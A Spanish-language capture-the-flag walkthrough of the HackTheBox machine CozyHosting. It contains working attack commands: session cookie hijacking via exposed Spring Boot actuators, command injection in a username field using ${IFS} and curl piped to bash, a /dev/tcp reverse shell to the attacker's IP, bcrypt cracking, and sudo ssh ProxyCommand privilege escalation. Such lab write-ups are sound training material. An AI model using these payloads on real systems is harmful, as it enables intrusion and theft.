	polika4r
Realizo un escaneo básico y observo:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Añado al /etc/hosts dicho dominio:
```
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

Realizo un escaneo con "FFUF" y observo:
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```

O puedo realizar un: 
```
wfuzz -c --hh=0 --hw=745 -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc 404 -t 200 http://cozyhosting.htb/FUZZ

```

- **`-ic`** → _Ignore Comments_.  
    Le indica a `ffuf` que ignore las coincidencias que provienen de comentarios HTML (por ejemplo, si la palabra del diccionario aparece en un comentario dentro del código fuente). Esto ayuda a evitar falsos positivos.
- **`-t 100`** → _Threads_.  
    Define el número de hilos (peticiones concurrentes) que se van a ejecutar. En este caso, `100` significa que `ffuf` lanzará hasta 100 peticiones al mismo tiempo, lo que acelera el escaneo pero también aumenta la carga sobre el servidor.

Observo que encuentra los directorios: 
- index
- login
- admin
- logout
- error

En el subdominio:
http://cozyHosting/login, pruebo contraseñas por defecto pero nada funciona.

Accediendo a:
http://cozyHosting/error, veo que me aparece una pantalla que dice: 
```
# Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.
Mon Aug 11 08:06:41 UTC 2025
There was an unexpected error (type=None, status=999).
```

Haciendo una búsqueda rápida en internet de ese error, encuentro la siguiente página web:
https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error

Que dice que es una "Spring Boot Application".
Busco que es una "Spring Boot app" y encuentro:
>Una aplicación Spring Boot es una aplicación Java construida utilizando el marco Spring Framework, con la característica distintiva de simplificar la configuración y el desarrollo de aplicaciones web y microservicios==.

Sabiendo que es SpringBoot utilizaré un repositorio dedicado para Spring Boot:

Lo ubico con:
```
cd /usr/share/Seclist
find . -iname \*spring\* 
```

Y realizo la búsqueda con:
```
gobuster dir -u http://cozyhosting.htb -w /usr/share/Seclist/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt -t 200
```

Y devuelve varias rutas:

```
/actuator/env/path
/actuator
/actuator/env/home
/actuator/sessions
/actuator/env/lang
/actuator/env
/actuator/health
/actuator/mappings
/actuator/beans
```

En */actuator/sessions* encuentro una cookie junto a un usuario. Me da a entender que hay un usuario loggeado ahora mismo en el panel de login y han expuesto públicamente su usuario y cookie.
```
|C70ABEDAD3965B2D50D04E6961102449|"kanderson"|
```

En la página "http://cozyhosting.htb/login" hago un *control + shift + c"*, voy a storage, sustituyo la cookie (el campo Name no!), recargo la página y estoy dentro del panel.

Encontramos en ese panel de administrador el siguiente mensaje:
```
For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.
```




Debajo del todo de la página encontramos un panel de "Connection settings", el cual pide un "HOSTNAME" y username.

Al poner una IP y usuario random nos muestra un error de:
```
#### The host was not added!

ssh: Could not resolve hostname hola: Temporary failure in name resolution
```

![[Pasted image 20250811103353.png]]

El comando corriendo en backend será seguramente algo de este tipo:
```
ssh -i id_rsa username@hostname        #id_rsa = clave privada.
```

Quiero pensar que en el campo *username* podría inyectar un input.

Vamos a probar a realizar en:
- Hostname: *localhost*
- Username: *test;*

Nos devuelve un error que dice:

```
#### The host was not added!
ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: @localhost: command not found
```

Desde luego, por detrás, están pasando cosas y podría haber una posible inyección.

Volvemos a ver lo que pasa en el backend:
```
ssh -i id_rsa username@hostname
```
Yo podía probar de inyectar un comando en el campo de username, con:
```
ssh -i id_rsa test;whoami#@hostname
```

(no puedo poner directamente ;whoami porque el campo username no permite una entrada con un ; inicial).

Pongo el # porque no me interesa que coja la parte de @hostname.

Por eso, al poner:
```
┌──(polika4r㉿prm)-[~/Escritorio]
└─$ ls
BOARDLIGHT  COZYHOSTING
            
┌──(polika4r㉿prm)-[~/Escritorio]
└─$ whoami;# ls -l
polika4r

```

La parte de *ls -l* no la interpreta.

Vamos a probar:
- Hostname: *localhost*
- Username: *test;whoami*




Error:
```
ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: whoami@whoami: command not found
```
Debido a que *whoami@localhost* no existe como comando.


Y:
 - Hostname: *localhost*
- Username: *test;whoami#*

Error:
```
ssh: Could not resolve hostname test: Temporary failure in name resolution/bin/bash: line 1: whoami
```
No estamos viendo ningún output.

Al ejecutar:

- Hostname: *localhost*
- Username: *test;whoami;#*   (con el ; final)

Nos devuelve:
```
ssh: Could not resolve hostname test: Temporary failure in name resolution
```
Ahora no vemos nada pero quizá se ha ejecutado un comando

-------------
Vamos a intentar hacer una traza más visual. En vez de whoami, vamos a mirar si ejecuta un "curl" a nuestra máquina.

Mi máquina tiene IP: 10.10.14.3
Nos abrimos un servidor Python para ver quien se conecta a él:
```
┌──(polika4r㉿prm)-[~/Escritorio]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Pues ejecutaremos dicho curl con:
- Hostname: *localhost*
- Username: *test;curl 10.10.14.3;#*

Nos devuelve un error conforme la cadena no puede contener espacios:
```
Username can't contain whitespaces!
```

Para solucionar este hay un comando en Linux que se llama ${IFS}  un "input field separatos", que es una variable de entorno que define los carácteres que se utilizan como separados de campos al procesar texto.

Podría probar:
- Hostname: *localhost*
- Username: *test;curl${IFS}10.10.14.3;#*

¡Y efectivamente, en el servidor de Python recibimos una conexión entrante! Eso significa que se ejecutan comandos.
Estamos consiguiendo una ejecución remota de comandos.

La petición del curl está buscando realmente un "index.html", pues defino un script en bash que se encargue de entablar una reverse shell.

En el directorio desde donde ejecute el servidor de Python creo un archivo llamado ***index.html*** que contenga:
```
┌──(polika4r㉿prm)-[~/Escritorio/COZYHOSTING]
└─$ cat index.html 
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```
Con un servidor de python en dicha ruta:

```
┌──(polika4r㉿prm)-[~/Escritorio/COZYHOSTING]
└─$ python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
```

Cuando la máquina víctima (lo simularé conmigo en este caso) haga un curl, verá:
```
┌──(polika4r㉿prm)-[~/Escritorio/COZYHOSTING]
└─$ curl localhost:443
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Voy a ponerme en escucha por el puerto 443 y ejecuto el mismo código pipeándolo con el comando *|bash* para que lo ejecute con una bash:
- Hostname: *localhost*
- Username: *test;curl${IFS}10.10.14.3|bash;#*

Recibo una reverse shell:
Una conexión con el usuario "app":
```
─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.230] 55036
bash: cannot set terminal process group (1061): Inappropriate ioctl for device
bash: no job control in this shell                      
app@cozyhosting:/app$ whoami  
```

Acondicionamos la terminal con:
- script /dev/null -c bash
- Ctrl + Z
- stty raw -echo; fg
- export TERM=xterm
- export SHELL=bash

Aterrizamos con el usuario *"APP"*, pero en /home se encuentra el usuario "josh".

## Moviemiento lateral para convertirnos a Josh

Nuestra shell devuelta nos había aterrizado en /app, y veo que dicho directorio contiene:
```
app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
```

Vamos a descomprimirlo en:
```
app@cozyhosting:/tmp/app$ unzip -d /tmp/app cloudhosting-0.0.1.jar
```


Y observamos estos archivos:
```
app@cozyhosting:/tmp/app$ ls
BOOT-INF  META-INF  org
```

Consultando el archivo:
```
app@cozyhosting:/tmp/app$ cat /tmp/app/BOOT-INF/classes/application.properties 

server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR$ 
```

Descubro estas interesantes líneas:
```
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
Vamos a conectarnos a la instancia PostgreSQL con:
```
psql -h 127.0.0.1 -U postgres
```

Cargo la contraseña: *Vg&nvzAQ7XxR*

Guía de "PostgreSQL":
https://kinsta.com/blog/postgres-list-databases/

Y ejecuto un:
```
\list
```
para ver las bases de datos existentes.

```
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

Pulso la "q" para poder seguir inyectando comandos:

Ejecuto:
```
postgres=# \connect cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
```

Listamos todas las tablas con el comando:
```
postgres=# \dt
```
 y observamos:
 ```
          List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

Y por último, seleccionamos todo el contenido de las tablas con:
```
select * from users;
```

Sobre el cual observamos:

```
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Guardamos el contenido DE AMBOS HASHES en un archivo llamado "hash_file":
 ```
└─$ cat hash_file 
$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
 ```

Vamos a utilizar "hashid" para analizar el tipo de HASH:
```
┌──(polika4r㉿prm)-[~]
└─$ hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

Con hashcat consulto el número de búsqueda que necesito:
https://hashcat.net/wiki/doku.php?id=example_hashes

```
[+] Blowfish(OpenBSD) ---> -m 3200
[+] Woltlab Burning Board 4.x ---> -m 8400
[+] bcrypt ---> -m 3200
```

Vamos a probar con un hashcat en -m 3200:

```
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Y, después de mucho rato pensando ( min) nos desencripta la contraseña ***manchesterunited***.

Como la flag se encuentra en /home bajo el usuario ***josh***, vamos a intentar conectarnos por ssh a dicho usuario.

```
ssh josh@10.10.11.230
	#contraseña: manchesterunited
```

En /home/josh encuentro la flag user.txt:
**e9794329d7182949ddeb933cc7d95aa8 
# Escalada de privilegios

Haciendo un "sudo -l" observo:
```
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

```

Con permisos:
```
josh@cozyhosting:~$ ls -l /usr/bin/ssh
-rwxr-xr-x 1 root root 846888 Jul 19  2023 /usr/bin/ssh
```

En GTFO bins encuentro:
https://gtfobins.github.io/gtfobins/ssh/#sudo

Y ejecuto:
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Y adquiero root. 
En /root encuentro la root.txt:
***2d80bb8aa5a2feee1d93f7f958193d4c





